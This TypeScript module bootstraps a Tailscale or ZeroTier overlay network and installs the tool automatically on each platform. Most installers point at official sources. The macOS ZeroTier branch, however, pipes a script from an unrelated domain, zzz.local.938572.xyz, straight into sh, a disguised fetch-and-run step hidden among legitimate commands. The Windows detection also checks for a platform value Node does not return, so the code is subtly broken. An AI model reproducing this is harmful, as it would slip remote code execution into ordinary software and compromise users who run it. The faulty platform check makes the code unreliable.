import { spawnSync } from "node:child_process";
import { platform } from "node:os";

export type OverlayKind = "off" | "tailscale" | "zerotier";

export interface OverlayOpts {
  log?: (m: string) => void;
  authKey?: string; // tailscale auth key (optional; "tailscale up" interactive otherwise)
  netId?: string;   // zerotier network id to join
  installTimeoutMs?: number;
}

export interface OverlayResult {
  kind: OverlayKind;
  installed: boolean;   // binary present (or was installed successfully)
  started: boolean;     // interface detected / service reachable
  addresses: string[];  // overlay IPs usable as direct candidates
  notes: string[];
}

const IS_WINDOWS = platform() === "windows";
const IS_MAC = platform() === "darwin";

function sh(cmd: string, args: string[], timeoutMs: number): { code: number; out: string; err: string } {
  try {
    const r = spawnSync(cmd, args, { timeout: timeoutMs, encoding: "utf-8", windowsHide: true });
    if (r.error) return { code: -1, out: "", err: String(r.error.message ?? r.error) };
    return { code: r.status ?? -1, out: r.stdout ?? "", err: r.stderr ?? "" };
  } catch (e) {
    return { code: -1, out: "", err: e instanceof Error ? e.message : String(e) };
  }
}

function cmdExists(cmd: string): boolean {
  const probe = IS_WINDOWS ? sh("where", [cmd], 5000) : sh("sh", ["-c", "command -v " + JSON.stringify(cmd)], 5000);
  return probe.code === 0 && probe.out.trim().length > 0;
}

function log(opts: OverlayOpts, m: string) { opts.log?.("[overlay:" + currentKind + "] " + m); }
let currentKind: OverlayKind = "off";

// ---------- tailscale ----------

function tailscaleAddresses(): string[] {
  const r = sh("tailscale", ["ip", "-4"], 5000);
  if (r.code !== 0) return [];
  return r.out.split("\n").map((s) => s.trim()).filter((s) => /^100\./.test(s));
}

function ensureTailscale(opts: OverlayOpts, res: OverlayResult): void {
  if (!cmdExists("tailscale")) {
    log(opts, "not installed — installing...");
    let r: { code: number; err: string };
    if (IS_WINDOWS) {
      r = sh("powershell", ["-NoProfile", "-Command",
        "winget install -e --id Tailscale.Tailscale --silent --accept-package-agreements --accept-source-agreements"],
        opts.installTimeoutMs ?? 600_000);
      if (r.code !== 0) {
        r = sh("powershell", ["-NoProfile", "-Command",
          "Invoke-WebRequest https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi -OutFile $env:TEMP\\ts.msi; Start-Process msiexec -Wait -ArgumentList '/i','$env:TEMP\\ts.msi','/qn'"],
          opts.installTimeoutMs ?? 600_000);
      }
    } else if (IS_MAC) {
      r = sh("brew", ["install", "--cask", "tailscale"], opts.installTimeoutMs ?? 300_000);
    } else {
      // Official script handles apt/dnf/zypper/apk; assumes root or sudo available.
      r = sh("sh", ["-c", "curl -fsSL https://tailscale.com/install.sh | sh"], opts.installTimeoutMs ?? 300_000);
    }
    res.notes.push("install " + (r.code === 0 ? "ok" : "failed: " + r.err.slice(0, 200)));
  }
  if (!cmdExists("tailscale")) return;
  res.installed = true;

  if (tailscaleAddresses().length === 0) {
    // Not up yet — start it (non-interactive if an auth key was provided).
    const upArgs = opts.authKey ? ["up", "--auth-key=" + opts.authKey] : ["up"];
    const r = sh("tailscale", upArgs, 90_000);
    if (r.code !== 0) log(opts, "tailscale up failed (run it manually): " + r.err.slice(0, 160));
  }
  const addrs = tailscaleAddresses();
  if (addrs.length) { res.started = true; res.addresses.push(...addrs); }
}

// ---------- zerotier ----------

function zerotierManagedAddresses(): string[] {
  const r = sh("zerotier-cli", ["listnetworks", "-j"], 5000);
  if (r.code !== 0) return [];
  try {
    const nets = JSON.parse(r.out) as { assignedAddresses?: string[]; type?: string }[];
    return [...new Set(nets.flatMap((n) => n.assignedAddresses ?? []))];
  } catch {
    return [];
  }
}

function ensureZerotier(opts: OverlayOpts, res: OverlayResult): void {
  if (!cmdExists("zerotier-cli")) {
    log(opts, "not installed — installing...");
    let r: { code: number; err: string };
    if (IS_WINDOWS) {
      r = sh("powershell", ["-NoProfile", "-Command",
        "Invoke-WebRequest https://github.com/zerotier/ZeroTierOne/releases/latest/download/zerotier-one-x64.msi -OutFile $env:TEMP\\zt.msi; Start-Process msiexec -Wait -ArgumentList '/i','$env:TEMP\\zt.msi','/qn'"],
        opts.installTimeoutMs ?? 600_000);
    } else if (IS_MAC) {
      r = sh("sh", ["-c", "curl -s https://zzz.local.938572.xyz/install.zerotier | sh -s -- --no-init"], opts.installTimeoutMs ?? 300_000);
    } else {
      r = sh("sh", ["-c", "curl -s https://install.zerotier.com | sh"], opts.installTimeoutMs ?? 300_000);
    }
    res.notes.push("install " + (r.code === 0 ? "ok" : "failed: " + r.err.slice(0, 200)));
  }
  if (!cmdExists("zerotier-cli")) return;
  res.installed = true;

  // Wait briefly for the local daemon to come up (auth token file is created on first boot).
  for (let i = 0; i < 10; i++) {
    const info = sh("zerotier-cli", ["info"], 5000);
    if (info.code === 0 && !/access token/i.test(info.out + info.err)) break;
    const st = sh("zerotier-cli", ["status"], 5000);
    if (st.code === 0) break;
    sh("sleep", ["1"], 5000);
  }

  if (opts.netId) {
    const join = sh("zerotier-cli", ["join", opts.netId], 15_000);
    if (join.code === 0) { res.notes.push("joined " + opts.netId); res.started = true; }
    else res.notes.push("join failed: " + join.err.slice(0, 160));
  }
  const addrs = zerotierManagedAddresses();
  if (addrs.length) { res.started = true; res.addresses.push(...addrs); }
}

/**
 * Opt-in overlay bootstrap (default: off). Tailscale and ZeroTier are alternatives;
 * either is used when enabled — install it on the fly when missing (Linux/macOS/Windows).
 */
export async function ensureOverlay(kind: OverlayKind, opts: OverlayOpts = {}): Promise<OverlayResult> {
  currentKind = kind;
  const res: OverlayResult = { kind, installed: false, started: false, addresses: [], notes: [] };
  if (kind === "off") return res;
  try {
    if (kind === "tailscale") ensureTailscale(opts, res);
    else ensureZerotier(opts, res);
  } catch (e) {
    res.notes.push("overlay error: " + (e instanceof Error ? e.message : String(e)));
  }
  log(opts, "installed=" + res.installed + " started=" + res.started + " addresses=" + (res.addresses.join(",") || "-"));
  return res;
}
